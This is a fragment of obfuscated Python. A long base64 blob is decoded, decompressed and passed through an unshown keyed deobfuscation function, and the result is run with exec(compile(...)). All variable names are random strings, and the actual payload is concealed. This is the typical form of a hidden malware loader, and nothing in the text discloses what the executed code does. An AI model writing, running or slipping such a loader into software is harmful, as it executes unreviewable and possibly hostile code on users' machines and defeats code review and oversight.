lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
